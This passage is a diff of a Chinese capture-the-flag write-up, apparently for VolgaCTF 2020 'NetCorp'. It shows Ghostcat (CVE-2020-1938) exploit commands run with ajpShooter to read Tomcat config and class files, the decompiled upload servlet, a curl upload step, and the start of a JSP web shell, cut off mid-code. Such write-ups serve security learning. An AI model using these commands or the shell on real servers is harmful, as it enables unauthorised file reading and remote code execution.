@@ -469,36 +469,273 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>而且访问<code>/docs</code>，得到apachetomcat信息,是9.0.24版本。基本确定是道java题，<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>接下来去搜索相关信息，发现了这样一个漏洞：<br>CVE-2020-1938 即tomcat的ghostcat漏洞<br>值得一提的是,ghostcat漏洞是由长亭爆出来的洞，GhostCat 主要是存在文件读取和包含漏洞<br>影响范围很广，几乎囊括了6-9版本。<br>我们又知道，文件上传+文件包含=RCE.因此尝试利用相关工具先进行文件读取，看看有无收获。<br>开始用的exp是这个<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a>,但是只能读文件不可执行命令。因此作罢。<br>我后来使用的exp来自<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a><br>这个exp不仅可以文件读取还可以包含，因此更适合</p>
 <p>首先,对tomcat服务必读的文件就是<code>WEB-INF/web.xml</code><br>尝试读取<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru  8009  /WEB-INF/web.xml read</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>NetCorp<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeScreenshotServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeScreenshot<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">description</span>&gt;</span>Complaint info<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeComplaintServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeComplaint<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC
+ &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
+ &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;
+
+&lt;web-app&gt;
+  &lt;display-name&gt;NetCorp&lt;/display-name&gt;
+
+
+  &lt;servlet&gt;
+        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
+        &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;
+        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+
+  &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+
+        &lt;servlet&gt;
+                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
+                &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;
+                &lt;description&gt;Complaint info&lt;/description&gt;
+                &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;
+        &lt;/servlet&gt;
+
+        &lt;servlet-mapping&gt;
+                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
+                &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;
+        &lt;/servlet-mapping&gt;
+
+        &lt;error-page&gt;
+                &lt;error-code&gt;404&lt;/error-code&gt;
+                &lt;location&gt;/404.html&lt;/location&gt;
+        &lt;/error-page&gt;
+
+
+
+&lt;/web-app&gt;</code></pre>
 <p>可以看到除了404.html这样的页面还有两个类的信息。这里可以推断class文件的路径,通过反编译class文件，得到网站源码<br>我按照roarctf easyjava的经验构造路径,路径勉强算理解，好歹我也是java入门编程的…<code>WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class</code>，另一个同理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeComplaintServlet.class read -o complaint.class</span><br><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeScreenshotServlet.class read -o screenshoot.class</span><br></pre></td></tr></table></figure>
+<pre><code> python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class read -o complaint.class
+ python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read -o screenshoot.class</code></pre><p>反编译后得到以下源码</p>
+<pre><code class="java">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
+// Jad home page: http://www.geocities.com/kpdus/jad.html
+// Decompiler options: packimports(3) 
+// Source File Name:   ServeComplaintServlet.java
 
-<p>反编译后得到以下源码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeComplaintServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeComplaintServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeComplaintServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+package ru.volgactf.netcorp;
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeScreenshotServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeScreenshotServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeScreenshotServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String appPath = request.getServletContext().getRealPath(<span class="string">""</span>);</span><br><span class="line">        String savePath = (<span class="keyword">new</span> StringBuilder()).append(appPath).append(<span class="string">"uploads"</span>).toString();</span><br><span class="line">        File fileSaveDir = <span class="keyword">new</span> File(savePath);</span><br><span class="line">        <span class="keyword">if</span>(!fileSaveDir.exists())</span><br><span class="line">            fileSaveDir.mkdir();</span><br><span class="line">        String submut = request.getParameter(<span class="string">"submit"</span>);</span><br><span class="line">        <span class="keyword">if</span>(submut != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(submut.equals(<span class="string">"true"</span>));</span><br><span class="line">        PrintWriter out = request.getParts().iterator();</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!out.hasNext())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            Part part = (Part)out.next();</span><br><span class="line">            String fileName = extractFileName(part);</span><br><span class="line">            fileName = (<span class="keyword">new</span> File(fileName)).getName();</span><br><span class="line">            String hashedFileName = generateFileName(fileName);</span><br><span class="line">            String path = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();</span><br><span class="line">            <span class="keyword">if</span>(!path.equals(<span class="string">"Error"</span>))</span><br><span class="line">                part.write(path);</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        out = response.getWriter();</span><br><span class="line">        response.setContentType(<span class="string">"application/json"</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        out.print(String.format(<span class="string">"&#123;'success':'%s'&#125;"</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">"true"</span></span><br><span class="line">        &#125;));</span><br><span class="line">        out.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateFileName</span><span class="params">(String fileName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s2;</span><br><span class="line">        StringBuilder sb;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">        md.update(fileName.getBytes());</span><br><span class="line">        <span class="keyword">byte</span> digest[] = md.digest();</span><br><span class="line">        s2 = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest)).toString(<span class="number">16</span>);</span><br><span class="line">        sb = <span class="keyword">new</span> StringBuilder(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count = <span class="number">32</span> - s2.length(); i &lt; count; i++)</span><br><span class="line">            sb.append(<span class="string">"0"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.append(s2).toString();</span><br><span class="line">        NoSuchAlgorithmException e;</span><br><span class="line">        e;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">extractFileName</span><span class="params">(Part part)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String contentDisp = part.getHeader(<span class="string">"content-disposition"</span>);</span><br><span class="line">        String items[] = contentDisp.split(<span class="string">";"</span>);</span><br><span class="line">        String as[] = items;</span><br><span class="line">        <span class="keyword">int</span> i = as.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            String s = as[j];</span><br><span class="line">            <span class="keyword">if</span>(s.trim().startsWith(<span class="string">"filename"</span>))</span><br><span class="line">                <span class="keyword">return</span> s.substring(s.indexOf(<span class="string">"="</span>) + <span class="number">2</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+import java.io.IOException;
+import java.io.PrintStream;
+import javax.servlet.ServletConfig;
+import javax.servlet.ServletException;
+import javax.servlet.http.*;
+
+public class ServeComplaintServlet extends HttpServlet
+{
+
+    public ServeComplaintServlet()
+    {
+        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);
+    }
+
+    public void init(ServletConfig config)
+        throws ServletException
+    {
+        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);
+    }
+
+    public void destroy()
+    {
+        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);
+    }
+
+    protected void doGet(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)
+        throws ServletException, IOException
+    {
+    }
+
+    protected void doPost(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)
+        throws ServletException, IOException
+    {
+    }
+
+    private static final long serialVersionUID = 1L;
+    private static final String SAVE_DIR = &quot;uploads&quot;;
+}</code></pre>
+<pre><code class="java">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
+// Jad home page: http://www.geocities.com/kpdus/jad.html
+// Decompiler options: packimports(3) 
+// Source File Name:   ServeScreenshotServlet.java
+
+package ru.volgactf.netcorp;
+
+import java.io.*;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Collection;
+import java.util.Iterator;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class ServeScreenshotServlet extends HttpServlet
+{
+
+    public ServeScreenshotServlet()
+    {
+        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);
+    }
+
+    public void init(ServletConfig config)
+        throws ServletException
+    {
+        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);
+    }
+
+    public void destroy()
+    {
+        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+        throws ServletException, IOException
+    {
+        String appPath = request.getServletContext().getRealPath(&quot;&quot;);
+        String savePath = (new StringBuilder()).append(appPath).append(&quot;uploads&quot;).toString();
+        File fileSaveDir = new File(savePath);
+        if(!fileSaveDir.exists())
+            fileSaveDir.mkdir();
+        String submut = request.getParameter(&quot;submit&quot;);
+        if(submut != null)
+            if(submut.equals(&quot;true&quot;));
+        PrintWriter out = request.getParts().iterator();
+        do
+        {
+            if(!out.hasNext())
+                break;
+            Part part = (Part)out.next();
+            String fileName = extractFileName(part);
+            fileName = (new File(fileName)).getName();
+            String hashedFileName = generateFileName(fileName);
+            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();
+            if(!path.equals(&quot;Error&quot;))
+                part.write(path);
+        } while(true);
+        out = response.getWriter();
+        response.setContentType(&quot;application/json&quot;);
+        response.setCharacterEncoding(&quot;UTF-8&quot;);
+        out.print(String.format(&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;, new Object[] {
+            &quot;true&quot;
+        }));
+        out.flush();
+    }
+
+    private String generateFileName(String fileName)
+    {
+        String s2;
+        StringBuilder sb;
+        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);
+        md.update(fileName.getBytes());
+        byte digest[] = md.digest();
+        s2 = (new BigInteger(1, digest)).toString(16);
+        sb = new StringBuilder(32);
+        int i = 0;
+        for(int count = 32 - s2.length(); i &lt; count; i++)
+            sb.append(&quot;0&quot;);
+
+        return sb.append(s2).toString();
+        NoSuchAlgorithmException e;
+        e;
+        e.printStackTrace();
+        return &quot;Error&quot;;
+    }
+
+    private String extractFileName(Part part)
+    {
+        String contentDisp = part.getHeader(&quot;content-disposition&quot;);
+        String items[] = contentDisp.split(&quot;;&quot;);
+        String as[] = items;
+        int i = as.length;
+        for(int j = 0; j &lt; i; j++)
+        {
+            String s = as[j];
+            if(s.trim().startsWith(&quot;filename&quot;))
+                return s.substring(s.indexOf(&quot;=&quot;) + 2, s.length() - 1);
+        }
+
+        return &quot;&quot;;
+    }
+
+    private static final String SAVE_DIR = &quot;uploads&quot;;
+}</code></pre>
 <p>主要内容在于<code>ServeScreenshotServlet</code>这个类。我们得到了上传文件的存在，也就是说可以通过上传+包含构造RCE了。<br>简单读下源码，其实就是指上传文件会传到<code>/upload</code>下，同时文件名变为上传文件名的md5值<br>直接使用curl传文件<br><code>curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot</code><br>myexp.jsp</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">String</span> disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="Javascript">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
+&lt;% 
+out.println(&quot;Executing command&quot;);
+Process p = Runtime.getRuntime().exec(&quot;ls&quot;);
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+while ( disr != null ) {
